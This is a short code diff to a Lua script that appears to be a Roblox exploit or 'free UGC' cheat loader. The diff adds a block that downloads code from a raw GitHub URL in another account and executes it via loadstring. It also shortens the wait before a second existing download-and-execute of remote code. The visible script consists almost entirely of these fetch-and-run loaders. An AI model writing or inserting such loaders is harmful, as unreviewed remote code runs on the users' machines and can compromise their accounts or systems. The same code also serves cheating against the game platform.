@@ -1,3 +1,7 @@
+spawn(function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/UGCfree/Ning/Info.lua"))()
+    end)
+
 local function fetchID()
     local firstUrl = "https://raw.githubusercontent.com/MADNESSTEST/need/main/new.txt"
     local id = game:HttpGet(firstUrl)
@@ -56,6 +60,6 @@ StarterGui:SetCore("SendNotification", {
 })
 
 spawn(function()
-    wait(5)
+    wait(3)
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MADNESSTEST/Pqoeirnfjw/main/AP3-5.lua"))()
   end)
